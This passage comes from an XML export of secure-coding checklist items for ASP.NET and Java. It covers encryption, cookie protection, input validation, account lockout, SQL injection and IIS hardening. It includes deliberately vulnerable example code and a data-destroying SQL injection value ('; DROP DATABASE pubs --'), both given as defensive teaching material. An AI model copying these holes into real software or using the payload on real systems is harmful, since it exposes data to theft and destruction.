&lt;p&gt;&lt;strong&gt;Encryption.&lt;/strong&gt; Encryption is a mechanism for storing and transmitting sensitive data in a retrievable way. If your application uses encryption as means for storing sensitive data, verify that the following pieces are in place:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Encryption Key&lt;/strong&gt;: Verify that your application's encryption keys are securely stored inside your application's key store. Consult the
&lt;a href="?#ruledisplay:E8373C06-29F7-4F7B-BAEB-24C5F19DFAC8"&gt;A Secure Key Storage Location is Used&lt;/a&gt; checklist for more details.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Function&lt;/strong&gt;: Check if your application uses AES, AES256, or a similar modern strong symmetric encryption function. 3DES and other, older algorithms should be avoided for new development.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Invocation&lt;/strong&gt;: Check if your application invokes the &lt;strong&gt;SymmetricAlgorithm.Create&lt;/strong&gt; and
&lt;strong&gt;ICryptoTransform.TransformFinalBlock&lt;/strong&gt; methods to perform the encryption procedure.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Clean-up&lt;/strong&gt;: Check if your application securely cleans-up all instances of the sensitive data and their encryption keys after the encryption procedure has been completed. Consult the
&lt;a href="?#ruledisplay:026A38B1-C59E-4BB7-952F-4EB7206E3717"&gt;Sensitive Data is Cleared from Memory when No Longer Used&lt;/a&gt; checklist for more details.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component relies on an independent account management system that resides on another server. The web component communicates
 with the account management system using a SQL socket connection. The two servers are located in a competitively priced data center that houses a number of other customers, all of which are able to access the building at all times. A malicious user purchases
 hosting services at the same company, and after exploring the hosting environment, learns that the hosted accounts are networked using a shared bus topology that allows for network snooping. The attacker is able to setup a sniffer, and captures all of the
 communication between the account management component and the web component, since SQL connections are not encrypted by default. The attacker can now log in as a legitimate user on the account management server and make changes at will.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about the SHA hashing functions, visit: &lt;a href="http://en.wikipedia.org/wiki/SHA_hash_functions"&gt;
SHA hash functions&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about symmetric cryptography, visit: &lt;a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm"&gt;
Symmetric-key algorithm&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:FCB0A4AC-A559-430D-9145-08340EC73FED"&gt;Guideline: Protect Sensitive Data Over the Network
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b3aa501e-1852-4eb9-ae31-aeda150b5634</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Authentication Cookie is Encrypted and its Integrity Checked</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that your application&amp;nbsp;encrypts the authentication cookie and checks for integrity.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Use Secure Sockets Layer (SSL) to protect the authentication credentials and authentication cookies passed between browser and server. By using SSL, you prevent an attacker monitoring the network connection to obtain authentication credentials and capturing
 the authentication cookie to gain spoofed access to your application.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b4d8c22c-4757-4e32-a5dd-1d5e75a938a9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Untrusted Output is Not Directly Echoed Back to the User</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application does not&amp;nbsp;echo the input back to the user without first validating and/or encoding the data.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Echoing input directly back to the user makes your application susceptible to malicious input attacks, such as cross-site scripting.&lt;/p&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:572ac2ef-647b-4cba-a976-7c285a6d475f"&gt;&lt;/a&gt;&lt;a href="?#ruledisplay:160c94cd-efc0-4885-9b0d-cd3ad60365e1"&gt;Do Not Echo Untrusted Data Back to the User&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b587bdc5-ec54-4143-86f4-8cd8f1f80455</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Input from All Sources is Validated</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check for input that has not been passed through a validation routine. All input from external sources should be validated.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Input that is not validated can lead to cross-site scripting, SQL injection, directory traversals, and other vulnerabilities which would allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;An application can take input via various ways such as a web interface, database, file system or other software running on the server. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input.&lt;br&gt;
&lt;/strong&gt;At design time identify all potential sources of input to your application. Once implemented, scour source code to discover sources of input that may have been missed in the design. Potential sources of input in a web application typically include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers (Host, accept types, www authentication, cache settings, encodings, etc)
&lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other services running on the system &lt;/li&gt;&lt;li&gt;Javascript variables &lt;/li&gt;&lt;li&gt;File upload and attributes (filename, size, data, etc) &lt;/li&gt;&lt;li&gt;DNS results or host names &lt;/li&gt;&lt;li&gt;External component call return values (COM, AJAX, ActiveX) &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Once you know&amp;nbsp;the types of input from where your application may receive data, look for all entry points. Good starting points are method parameters and assignment statements. For example:
&lt;/p&gt;
&lt;p&gt;This method uses the &lt;strong&gt;searchTerm&lt;/strong&gt; variable:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;void aggregateData(PrintWriter out, String searchTerm)&lt;br&gt; ...&lt;br&gt;double[] rData = common.queryDBForIndex(searchTerm);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;This assignment stores data from a &lt;strong&gt;GET&lt;/strong&gt; request parameter named
&lt;strong&gt;index&lt;/strong&gt; and stores it in the &lt;strong&gt;String searchTerm&lt;/strong&gt;. Ensure that this input is validated:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;This assignment uses the input that was gathered above to store more input from a database. Verify that
&lt;strong&gt;searchTerm&lt;/strong&gt; is validated before this use, and also ensure that &lt;strong&gt;
rData&lt;/strong&gt; is validated as another source of input.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;double[] rData = common.queryDBForIndex(searchTerm);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink.&lt;br&gt;
&lt;/strong&gt;Trace each source of input from the immediate source through your application to its final destination. The final sink may be in memory, on the hard drive, sent over the network or stored in a data store such as a database.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines.&lt;br&gt;
&lt;/strong&gt;Each input source should have a validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating many throughout the code base, so check for
 consolidation of routines to aid testing and reduce the chance of one-off bugs. If any input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validators.&lt;br&gt;
&lt;/strong&gt;Validation routines should check for length, range, format and type. Validation should first check for good data through whitelisting then for known malicious data through blacklisting. Do not rely on client-side validation alone as it can be bypassed
 easily.&lt;br&gt;
&lt;br&gt;
For more information see Checklist Item: &lt;a href="?#ruledisplay:6D944640-22E7-421F-8192-45730D5118AB"&gt;
Input is Validated for Length, Range, Format and Type&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Unfortunately, the application validates the user's input but not the returned data from the database. Therefore, the application is vulnerable to an integer overflow that can harm the
 business logic used in generating the data analysis.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application validates the user-supplied input&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                        retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling&lt;br&gt;                        // mechanisms. Consult the Exception Handling and&lt;br&gt;                        // Logging sections&lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                   // Add the appropriate logging and exception handling&lt;br&gt;                   // mechanisms. Consult the Exception Handling and&lt;br&gt;                   // Logging sections&lt;br&gt;                   out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;       boolean validateSearchTerm(String input)&lt;br&gt;      {&lt;br&gt;            String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;            int goodLength = 8;&lt;br&gt;             if (input == null)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;             if(input.length() &amp;gt; goodLength)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(input);&lt;br&gt;                        if(!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        return true;&lt;br&gt;      }&lt;br&gt;       void aggregateData(PrintWriter out, String searchTerm)&lt;br&gt;      {&lt;br&gt;            double[] rData = common.queryDBForIndex(searchTerm);&lt;br&gt;             // The application fails to validate the returned&lt;br&gt;             // data from the database&lt;br&gt;             // Business logic that performs certain data analysis&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bcb144ff-0fe5-4a45-afea-1b31fba45f8d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Accounts are Locked After Consecutive Failed Login Attempts</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that accounts&amp;nbsp;are locked after consecutive failed login attempts. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Multiple, consecutive failed authentication attempts over a short period of time are a symptom that is used to detect when an account is under attack. Locking out the account prevents the attacker from compromising and accessing the account.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Follow these steps to ensure your application will lock out an account after consecutive failed login attempts:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify your application has a lockout policy. &lt;/strong&gt;An account lockout policy is typically application specific. Review your application's requirements and design specifications and verify the&amp;nbsp;following functionality:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A mechanism for determining failed authentication attempts &lt;/li&gt;&lt;li&gt;A mechanism for locking accounts that have exceeded the maximum number of allowed authentication attempts
&lt;/li&gt;&lt;li&gt;A mechanism for unlocking accounts that have exceeded the maximum number of allowed authentication attempts&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure your application tracks login attempts. &lt;/strong&gt;All authentication procedures record the number of authentication attempts for each user
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The login counter for each user is reset to 0 upon a successful authentication&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure your application enforces the lockout policy. &lt;/strong&gt;All authentication procedures implement your application's lockout policy
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The implementation matches the lockout policy as the business requirements of your organization may change over time&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; PCI DSS certification requires that logs should include failed access attempts, that a user gets locked out after no more than 6 failed login attempts, and the lockout lasts for&amp;nbsp;at least&amp;nbsp;30 minutes.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code executes the database transaction that is required during authentication. Because the transaction fails to check the login attempts counter, it is possible for an attacker to compromise an account through the use of brute force or a dictionary
 attack.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;// The application fails to check the number of login attempts&lt;br&gt;String dbStatement = &amp;quot;select user from users where user = ? and pass = ?;&amp;quot;;&lt;br&gt;st = dbConnection.prepareStatement(dbStatement);&lt;br&gt;st.setString(1, user);&lt;br&gt;st.setString(2, passDigest);&lt;br&gt;rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:32965A97-7033-4A05-97E0-EDDBAA59EF7C"&gt;Guideline: Lock Accounts After Consecutive Failed Login Attempts (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bddea980-c4cd-41b1-a807-4cd2efe3957f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Database Input is Validated</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that all input passed to the database is validated.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unvalidated input can lead to persistent cross-site scripting, SQL injection and other vulnerabilities&amp;nbsp;that would allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check if all input passed to database is validated:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify database entry points. &lt;/strong&gt;Identify all locations within your application that interface with the database servers. Potential sources of input include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Javascript variables&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink. &lt;/strong&gt;Trace each source of input from the immediate source, through your application and&amp;nbsp;to the backend database.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines. &lt;/strong&gt;Each input source should have a validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating many
 throughout the code base, so check for consolidation of routines to aid testing and reduce the chance of one-off bugs. If any input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validators. &lt;/strong&gt;Validation routines should check for length, range, format and type.&amp;nbsp;The validator&amp;nbsp;should first check for good data&amp;nbsp;via whitelisting and then for known malicious data&amp;nbsp;via blacklisting. Do not rely on client-side
 validation alone as it can be bypassed easily. For more information see Checklist Item:
&lt;a href="?#ruledisplay:6D944640-22E7-421F-8192-45730D5118AB"&gt;Input is Validated for Length, Range, Format and Type&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that parameterized queries are used. &lt;/strong&gt;Using the &lt;a href="?#ruledisplay:AA3B4801-99BA-43B0-90A6-D38A605E8574"&gt;
Type Safe SQL Parameters are Used&lt;/a&gt; checklist, verify that all database transactions are handled using
&lt;strong&gt;PreparedStatement&lt;/strong&gt; objects.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to query a database. Unfortunately, the application fails to validate the user's input; therefore, an attacker can access the backend database on behalf of the application through the use of SQL injection.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public void doGet(HttpServletRequest request,&lt;br&gt;     HttpServletResponse response) throws ServletException, IOException&lt;br&gt;{&lt;br&gt;     PrintWriter out = response.getWriter();&lt;br&gt;     String query = request.getParameter(&amp;quot;query&amp;quot;);&lt;br&gt;     String retData = &amp;quot;&amp;quot;;&lt;br&gt;      // The application fails to validate the user-supplied&lt;br&gt;      // query before submitting it to the database server&lt;br&gt;     retData = queryDB(query);&lt;br&gt;      ...&lt;br&gt;     out.flush();&lt;br&gt;     out.close();&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A tutorial on regular expressions is available at: &lt;a href="http://www.regular-expressions.info/"&gt;
Regular-Expressions.info&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information on using regular expression in Java, see: &lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/util/regex/Pattern.html"&gt;
Class Pattern&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702"&gt;Guideline: Validate All Input Passed to Database (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bded62d7-0aae-44d3-9acc-25eda486fd3d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Access to the metabase is restricted by using NTFS permissions (%systemroot%\system32\inetsrv\metabase.bin).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that access to the metabase (%systemroot%\system32\inetsrv\metabase.bin)&amp;nbsp;is restricted by using NTFS permissions.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Security and other IIS configuration settings are maintained in the IIS metabase file. Harden the NTFS permissions on the IIS metabase (and the backup metabase file) to be sure that attackers cannot modify your IIS configuration in any way (for example,
 to disable authentication for a particular virtual directory.)&lt;/p&gt;
&lt;p&gt;During this step, you: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Restrict access to the metabase using NTFS permissions&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Restrict banner information returned by IIS&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Restrict Access to the Metabase Using NTFS Permissions&lt;/h3&gt;
&lt;p&gt;Set the following NTFS permissions on the IIS metabase file (Metabase.bin) in the \WINNT\system32\inetsrv directory.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Local System: Full Control &lt;/li&gt;&lt;li&gt;Administrators: Full Control &lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bf418d65-90af-47f9-a868-5ca605aff024</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Dynamic Queries that Accept User Input are used only if Stored Procedures Cannot be used</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that your application avoids constructing SQL queries in code that include user input. Make sure that it uses parameterized stored procedures that use type safe SQL parameters.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If you construct queries dynamically using user input, your code is susceptible to SQL injection.
&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;For example, avoid the following style of code.&lt;/p&gt;
&lt;pre&gt;// Use dynamic SQLSqlDataAdapter&lt;br&gt; myCommand = new SqlDataAdapter(&lt;br&gt;         &amp;quot;SELECT au_lname, au_fname FROM authors WHERE au_id = '&amp;quot; &amp;#43;&lt;br&gt;          SSN.Text &amp;#43; &amp;quot;'&amp;quot;, myConnection);  &lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;If a malicious user supplies &amp;quot;' ; DROP DATABASE pubs --'&amp;quot; for the SSN.Text field, the code inserts the user's malicious input and generates the following query:&lt;/p&gt;
&lt;pre&gt;SELECT au_lname, au_fname FROM authors WHERE au_id = ''; DROP DATABASE pubs --'  &lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;The ; (semicolon) character tells SQL that this is the end of the current statement, which is then followed by the malicious SQL code, which in this example drops the authors table.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c056e11f-1a37-42bf-97a1-09b31acf3d77</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Pages that Use SSL are Optimized</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application uses SSL only for&amp;nbsp;pages that contain or capture sensitive data.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Using SSL is expensive, so only use it&amp;nbsp;for pages that require it. This includes pages that contain or capture sensitive data, such as pages that accept credit card numbers and passwords. Use SSL only if the following conditions are true:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You want to encrypt the page data. &lt;/li&gt;&lt;li&gt;You want to guarantee that the server to which you send the data is the server that you expect.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For pages where you must use SSL, follow these guidelines: &lt;/p&gt;
&lt;ul&gt;
